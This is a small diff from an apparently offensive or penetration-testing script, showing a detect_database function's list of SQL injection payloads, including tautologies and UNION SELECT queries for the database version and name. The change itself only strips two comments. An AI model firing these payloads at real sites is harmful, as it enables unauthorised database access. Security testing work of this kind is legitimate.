@@ -234,8 +234,8 @@ def detect_database(target_url, session):
     payloads = [
         "' OR 1=1 --",  
         "' AND 1=1 --",
-        "' UNION SELECT null, version() --",  # To get database version
-        "' UNION SELECT null, database() --"  # To get database name
+        "' UNION SELECT null, version() --",  
+        "' UNION SELECT null, database() --"  
     ]
     for payload in payloads:
         encoded_payload = url_encode_payload(payload)
